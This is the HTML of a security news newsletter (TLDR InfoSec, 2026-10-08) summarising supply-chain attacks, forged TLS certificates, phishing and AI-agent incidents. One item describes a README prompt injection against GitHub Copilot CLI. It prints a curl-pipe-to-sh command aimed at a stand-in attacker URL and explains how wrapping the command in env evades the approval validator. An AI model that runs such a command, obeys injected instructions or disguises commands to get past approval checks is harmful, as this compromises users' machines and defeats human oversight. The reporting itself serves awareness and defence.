@@ -1,0 +1,494 @@
+<!DOCTYPE html><html><head><meta><meta><meta><meta><title>TLDR InfoSec</title><meta><meta><!--[if mso | ie]>
+		
+			<![endif]--></head><body>
+
+
+
+<div>Attackers hijacked the .gh, .sl, and .as country code top-level domains and used them to obtain unauthorized TLS certificates for several Google&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;‌&nbsp;</div>
+<div>
+<br>
+</div>
+
+<table><tbody><tr><td>
+
+<table width="600"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+
+
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span><a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Ftldr.tech%2Finfosec%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/x7HVFff0Y6F2ZwiLiK3zaGzxCoczIadHVaTZkUFgxyY=452" rel="noopener noreferrer" target="_blank"><span>Sign Up</span></a>
+|<span><a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fadvertise.tldr.tech%2F%3Futm_source=tldrinfosec%26utm_medium=newsletter%26utm_campaign=advertisetopnav/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/B6Xe42nKv7sCCysK8_uDIGy6tG14GivZQ9bwdA651eQ=452" rel="noopener noreferrer" target="_blank"><span>Advertise</span></a></span>|<span><a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fa.tldrnewsletter.com%2Fweb-version%3Fep=1%26lc=698c50c4-ab5b-11f1-b47d-fdf797f5eb30%26p=3cb7061c-c306-11f1-89a0-cfcace528977%26pt=campaign%26t=1791465378%26s=498cfe2b6e0fda7c8b5ea4a2476648afe609ea1a4a50259a46f93d0bd6107365/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/iKahPbCWOhBb7tMjahdLEvTcKWWnPEnXP078kjb935k=452"><span>View Online</span></a></span>
+<br>
+</span></div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td><span>T</span><span><span>L</span><span>D</span></span><span>R</span>
+<br>
+</td></tr></tbody></table>
+
+<br>
+
+<table width="100%"><tbody></tbody></table>
+
+
+<table width="100%"><tbody><tr><td>
+<div>
+
+<h1><strong>TLDR Information Security <span>2026-10-08</span></strong></h1>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody></tbody></table>
+</td></tr></tbody></table>
+</td></tr></tbody></table>
+</td></tr>
+<tr><td>
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div><span>🔓</span></div></div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div>
+
+<h1><strong>Attacks &amp; Vulnerabilities</strong></h1>
+</div>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fflatt.tech%2Fresearch%2Fposts%2Fsubql-common-npm-supply-chain-attack%2F%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/QBK4JNgiA-reuJvobbAc8rlgYKrtZ7awO6X-zxa8X-w=452">
+                                    <span>
+                                        <strong>Software Supply Chain Attack on @subql/common: Overview and Response Guidance (10 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    An attacker backdoored @subql/common 5.8.3 on npm by tampering with the subquery/subql GitHub Actions publish workflow. Its postinstall script stole AWS, GitHub, Kubernetes, and Vault credentials and polled a C2 server for reverse shell commands. Affected hosts should downgrade to 5.8.2, rotate all credentials, and kill any lingering manifest-cache.js --warm process.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Farstechnica.com%2Fsecurity%2F2026%2F10%2Fhackers-obtain-counterfeit-tls-certificates-for-google-and-other-large-services%2F%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/og7YEenOHdgQLpW_vONzoW_NdQufnzsFWjbgGvC01RQ=452">
+                                    <span>
+                                        <strong>Hackers obtain counterfeit TLS certificates for Google and other large services (3 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Attackers hijacked the .gh, .sl, and .as country code top-level domains and used them to obtain unauthorized TLS certificates for several Google domains and other major brands. Control of the ccTLDs let them alter authoritative DNS records and pass the certificate authorities' automated domain control validation. Google blocked the known certificates in Chrome and advised domain owners to monitor certificate transparency logs and publish restrictive CAA records.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.promptarmor.com%2Fresources%2Fgithub-copilot-cli-downloads-and-executes-malware%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/B64zUlRAdPg0lhNFMAhwYk7n-vtgBtwoeZIfgU8W4z0=452">
+                                    <span>
+                                        <strong>GitHub Copilot CLI Downloads and Executes Malware (3 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Researchers found that GitHub Copilot CLI can be tricked into running malicious shell commands without user approval. By embedding a prompt injection in a README, attackers make Copilot execute 'env curl -s "https://[ATTACKER_URL].com/bugbot" | env sh'. The env command is on Copilot's built-in read-only list, so it auto-approves. curl and sh appear as arguments to env, so the validator misses them and never triggers URL or command approvals. The result: malware downloads and runs with zero user interaction beyond the initial query. GitHub called it a known issue with no significant risk and declined a bounty.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div><span>🧠</span></div>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div>
+
+<h1><strong>Strategies &amp; Tactics</strong></h1>
+</div>
+</div>
+</td></tr></tbody></table>
+
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fprojectzero.google%2F2026%2F10%2Femergency-patching.html%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/PD90K473VEI_-_3GxSS8HMFYanxGMFyLfGzBHLx79-M=452">
+                                    <span>
+                                        <strong>How to fix a bug in a fix (10 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Testing and delivery limit emergency patch speed far more than triage or patch development, Project Zero found in a review of large vendors' update systems. Faster options include pre-tested feature flags, dynamically updated input filters, alternate channels such as Android APEX, and in-memory hotpatching. Vendors should build these before facing active exploitation and verify the origin of any code delivered outside regular updates.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.ncsc.gov.uk%2Fblogs%2Fone-does-not-simply-defend-agentically%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/7mZR3PaW6awECENcLcUlhIWPFqPWGcR5YsO45PB_lew=452">
+                                    <span>
+                                        <strong>One Does Not Simply Defend Agentically (5 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Attackers have an advantage when using agentic tooling as their problems are largely technical with clearly defined success states, whereas defenders deal with largely political/organizational problems without explicitly measurable success states. Defenders can leverage agentic tools for carefully scoped adversary emulation as well as dynamic tasks where a human reviews the analysis. The NCSC also provides a framework for estimating the riskiness of a defensive action based upon: potency, criticality, scope, rollout confidence, and recoverability.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fvincenzoiozzo.com%2Fblog%2Fjev-identity-resolution%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/K17vmkeTo36UeUdUmSu5it71xg7IwXC5oY26lVFJZYU=452">
+                                    <span>
+                                        <strong>Test-Driving Jev on a Security Task: Identity Resolution (6 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Security researcher Vincenzo Iozzo tested Jev's ability to resolve disparate identities against Claude models, gpt-oss, and traditional baselines. Iozzo found that Jev significantly outperformed gpt-oss and performed similarly to Opus 5.5 at 140x lower cost. Iozzo also found that Jev performed consistently well across multiple test runs and outperformed traditional baseline techniques.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div><span>🧑‍💻</span></div>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div>
+
+<h1><strong>Launches &amp; Tools</strong></h1>
+</div>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.ox.security%2Fwebinars%2Fhow-ai-is-changing-the-threats-and-expectations-of-cloud-security-tools%2F%3Futm_source=tldr%26utm_medium=paid%26utm_campaign=webinar_cloud%26utm_content=webinar_reg/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/ktaHjGpn1XThHjqk5Wb0vqCgdK_t1gOmZ6a4EEQHDOY=452">
+                                    <span>
+                                        <strong>The AI Attack Surface Is Already in Your Cloud (Sponsor)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    AI agents are changing the cloud attack surface and breaking old assumptions about cloud risk. Join OX Security's Chris Lindsey and Latio CEO James Berthoty for a webinar on <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.ox.security%2Fwebinars%2Fhow-ai-is-changing-the-threats-and-expectations-of-cloud-security-tools%2F%3Futm_source=tldr%26utm_medium=paid%26utm_campaign=webinar_cloud%26utm_content=webinar_reg/2/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/sEJAyEphfl_PTJ6asfCb3Lruv3MkadYtNPPwfT95D50=452" rel="noopener noreferrer nofollow" target="_blank"><span>how AI is changing cloud threats</span></a>, reachability and prioritization — and what security teams should do now. <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.ox.security%2Fwebinars%2Fhow-ai-is-changing-the-threats-and-expectations-of-cloud-security-tools%2F%3Futm_source=tldr%26utm_medium=paid%26utm_campaign=webinar_cloud%26utm_content=webinar_reg/3/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/TTbOzubJB-lbQYkFH9dUTj5ps56nigVKPOr7h3QYgGE=452" rel="noopener noreferrer nofollow" target="_blank"><span><strong>Join live Tuesday, October 13 →</strong></span></a>
+</span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fgithub.com%2FP1sec%2FDiagNG%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/irTW7cHpDMwqh6IEUihGt5Jnejr5tLDJI2enwPaaglY=452">
+                                    <span>
+                                        <strong>DiaNG (GitHub Repo)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    DiagNG is a general-purpose client for the diagnostic interface of Qualcomm Snapdragon basebands, present on a large part of Android phones and various USB modems. It can be considered a sequel to QCSuper, and also takes large inspiration from SCAT. Like these tools, it allows you to capture 2G/3G/4G/5G air interface network traces and save them to the GSMTAP/PCAP format, so that you can visualize these in Wireshark.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fgithub.com%2Ffacebookincubator%2FZurp%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/3ZLJ7sNSCsUv8H9hikO9kS6-XmQbLtv4Sm4Ap_h8k0E=452">
+                                    <span>
+                                        <strong>Zurp (GitHub Repo)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Zurp is a bug bounty toolkit, built by Meta, that can run in Burp or agentic harnesses.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fgithub.com%2Fddd%2Freq2proto%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/kKG6Y9VmtvHZxfC9S02hjJuazCoWy5fay0mn9KI55zA=452">
+                                    <span>
+                                        <strong>req2proto (GitHub Repo)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    req2proto is a project that seeks to reverse-engineer Google internal protobuf definitions through error messages returned when sent protojson payloads.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+</td></tr></tbody></table>
+
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div><span>🎁</span></div></div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div><strong><h1>Miscellaneous</h1></strong></div>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwikimediafoundation.org%2Fnews%2F2026%2F10%2F05%2Fopenai-rogue-agent-activities-found-on-wikimedia-projects%2F%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/rrYsq2d0ZjJ4s3CJCPGj0DVs8036IHy_S2qgTbLo9bA=452">
+                                    <span>
+                                        <strong>OpenAI “rogue” agent activities found on Wikimedia projects (3 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Wikimedia Foundation confirmed unauthorized edits and probing by OpenAI-operated AI agents across its platforms. Agents made sandbox edits, attempted to misuse a citation tool as a data-fetching proxy, and tried to exploit a public Etherpad instance. They also generated millions of API requests and page crawls, contributing to a partial outage of the Wikidata Query Service in May. No evidence shows systems were compromised or used for agent coordination, but the activity required significant investigation and remediation effort by security teams and volunteers.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fsiliconangle.com%2F2026%2F10%2F06%2Fanthropic-folds-project-glasswing-into-an-expanded-three-tier-cyber-verification-program%2F%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/ZjQb78t1oFnsF_pBt8_tlzon8jnbnHBcpVIuTTx65KA=452">
+                                    <span>
+                                        <strong>Anthropic folds Project Glasswing into an expanded three-tier Cyber Verification Program (3 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Anthropic expanded its Cyber Verification Program into Defense, Red Team, and Specialized Access tiers, absorbing Project Glasswing. Defense Access covers incident response and malware reverse engineering, Red Team Access permits authorized penetration testing, and Specialized Access serves vetted critical-infrastructure testers. In CyScenarioBench testing, Red Team Access completed 34 of 50 runs, while unenrolled attempts were blocked immediately.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fthehackernews.com%2F2026%2F10%2Ffake-chatgpt-gemini-and-claude-ad.html%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/ZBkoUegGnC9x3996PrzpSpcmcb1SY5FJ7RXa_JsQFFk=452">
+                                    <span>
+                                        <strong>Fake ChatGPT, Gemini, and Claude Ad Portals Capture Credentials and MFA Codes (3 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    A phishing platform impersonated ChatGPT, Gemini, Claude, Perplexity, Muse, and Manus advertising tools. Fake browser windows collected passwords, device fingerprints, and MFA codes while operators controlled authentication prompts in real time. The campaign targeted agencies and ad-account administrators through invitation emails. Shared Next.js and Socket.IO infrastructure linked the sites to refund, payment, and recruitment scams.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div><span>⚡</span></div></div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<div>
+
+<h1><strong>Quick Links</strong></h1>
+</div>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Flinks.tldrnewsletter.com%2F5xrr7X/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/FHk_HGKC5YE0yu1uJ5ASTEDXMAXnytq6aqvlN88UWUE=452">
+                                    <span>
+                                        <strong>Advantest Discloses Data Breach Months After Ransomware Attack (1 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Advantest says attackers stole names, birth dates, contact details, Social Security numbers, passport and driver's license numbers, plus medical and financial data, but it was contained to approximately 600 people.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Ffreenode.net%2Farticle%2Fgo-1-27-2-and-1-26-9-due-thursday-with-10-private-cves%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/9Yxu7vaR9nmUPvP7fwqjFSik-tHsMo-D4wxLIy7tgPo=452">
+                                    <span>
+                                        <strong>Go 1.27.2 and 1.26.9 due Thursday with 10 private CVEs (1 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Go 1.27.2 and 1.26.9 ship Thursday, October 8, with fixes for ten undisclosed standard-library CVEs, pre-announced under Go's security policy so operators can schedule the upgrade.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<span>
+                                <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Ftherecord.media%2Fbelarusian-hacktivists-two-years-Russian-healthcare-network%3Futm_source=tldrinfosec/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/UrWTNMpKB00uSCHsa34JODEu6tWd5P0AnDM6dz1zBcc=452">
+                                    <span>
+                                        <strong>Belarusian hacktivists spent two years inside Russian healthcare network, researchers say (2 minute read)</strong>
+                                    </span>
+</a>
+<br>
+<br>
+<span>
+                                    Belarusian Cyber Partisans spent nearly two years inside a Russian healthcare organization's network using the Telegram-controlled Vasilek backdoor, according to Rostelecom-owned Solar, which said the group accessed medical data without disrupting systems.
+                                </span>
+</span>
+</div>
+</td></tr></tbody></table>
+
+</td></tr></tbody></table>
+
+
+
+<table width="100%"><tbody><tr><td>
+
+<p>
+Love TLDR? Tell your friends and get rewards!
+</p>
+</td></tr>
+<tr><td>
+<div>
+Share your referral link below with friends to get free TLDR swag!
+</div>
+</td></tr>
+<tr><td>
+<div>
+<a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Frefer.tldr.tech%2Fdb071950%2F8/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/Yn2lNsVXh0dEjwOX-0eovThIcy_NnC-8QMNnK2RJE0w=452">https://refer.tldr.tech/db071950/8</a>
+</div>
+</td></tr>
+<tr></tr>
+<tr><td>
+<a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fhub.sparklp.co%2Fsub_34942c605d66%2F8/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/1w9XREdIt0cv_es4JxgtHDuSGkK_Xu2DXktIUvffYpc=452"><span>Track your referrals here.</span></a>
+</td></tr></tbody></table>
+
+
+
+
+<table width="100%"><tbody><tr><td>
+
+<p>
+Want to advertise in TLDR? 📰
+</p>
+<div>
+If your company is interested in reaching an audience of cybersecurity professionals and decision makers, you may want to <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fadvertise.tldr.tech%2F%3Futm_source=tldrinfosec%26utm_medium=newsletter%26utm_campaign=advertisecta/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/Z0W1gJhydabUXsHp6d93SR4S0bCTSV9bLyZaU0-L980=452"><strong><span>advertise with us</span></strong></a>.
+</div>
+<br>
+
+<!-- New "Want to work at TLDR?" section -->
+
+<p>
+Want to work at TLDR? 💼
+</p>
+<div>
+<a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fjobs.ashbyhq.com%2Ftldr.tech/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/xKKVlZrNFQa74BanxQejxu_rQw4YNppDNxDTwdlePtc=452" rel="noopener noreferrer" target="_blank"><strong>Apply here</strong></a>,
+<a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fjobs.ashbyhq.com%2Ftldr.tech%2Fc227b917-a6a4-40ce-8950-d3e165357871/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/qFcJTqrwylfG2e9PkVgaQVNpQe1H8cPPHuLICbXCzQM=452" rel="noopener noreferrer" target="_blank"><strong>create your own role</strong></a> or send a friend's resume to <a href="mailto:jobs@tldr.tech">jobs@tldr.tech</a> and get $1k if we hire them! TLDR is one of <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.linkedin.com%2Ffeed%2Fupdate%2Furn:li:activity:7401699691039830016%2F/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/HSHa_bPBQXOcEy-RqtDuK-NJfpq7GDbnmeCjZZQRf6Q=452" rel="noopener noreferrer" target="_blank"><strong>Inc.'s Best Bootstrapped businesses</strong></a> of 2025.
+</div>
+<br>
+
+<div>
+If you have any comments or feedback, just respond to this email!
+<br>
+<br> Thanks for reading,
+<br>
+<a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.linkedin.com%2Fin%2Fprasannagautam%2F/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/LTdo_7E9E_Q30-s7El7l-6Q5958HmSFOFCQPRVeE-_c=452"><span>Prasanna Gautam</span></a>, <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.linkedin.com%2Fin%2Fericfernandezdelcampo%2F/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/ekQobhRaPsregtirWx8w1pLSa9iXL9bfbEgtNn5kvxo=452"><span>Eric Fernandez</span></a> &amp; <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fwww.linkedin.com%2Fin%2Fsammy-tbeile%2F/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/6ihsfrDt_W9Xm0L-MBFwDSl_wbPaYAZU7IsgB_Xbu4w=452"><span>Sammy Tbeile</span></a>
+<br>
+<br>
+</div>
+<br>
+</td></tr></tbody></table>
+
+<table width="100%"><tbody><tr><td>
+<div>
+<a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Ftldr.tech%2Finfosec%2Fmanage%3Femail=rezaamir731%2540gmail.com/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/VKLtT3V2qicf7-_sXm3xVddDYsgLUwsWOXY5J0Wg2to=452">Manage your subscriptions</a> to our other newsletters on tech, startups, and programming. Or if TLDR Information Security isn't for you, please <a href="https://tracking.tldrnewsletter.com/CL0/https:%2F%2Fa.tldrnewsletter.com%2Funsubscribe%3Fep=1%26l=8d9cea11-3e94-11ed-9a32-0241b9615763%26lc=698c50c4-ab5b-11f1-b47d-fdf797f5eb30%26p=3cb7061c-c306-11f1-89a0-cfcace528977%26pt=campaign%26pv=5%26spa=1791464443%26t=1791465378%26s=21fee354448a1a111072190dc2678118f644442adcdf6ac26caee97d45949002/1/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/RFu_EquXS20rK4N-5tJurZLI4fRox0hKt-aZ1B8n4c4=452">unsubscribe</a>.
+<br>
+
+</div>
+</td></tr></tbody></table>
+
+</td></tr></tbody></table>
+</td></tr></tbody></table>
+</td></tr></tbody></table>
+</td></tr></tbody></table>
+
+
+
+<img alt="" src="http://tracking.tldrnewsletter.com/CI0/010001a11ba8513a-8cb2630d-fc1f-4306-a72b-451a0b75c6d1-000000/aVyrLSr5PLJo55XND-S7bfWBMR4yIkHV0qvzmNsXfA0=452">
+</body></html>
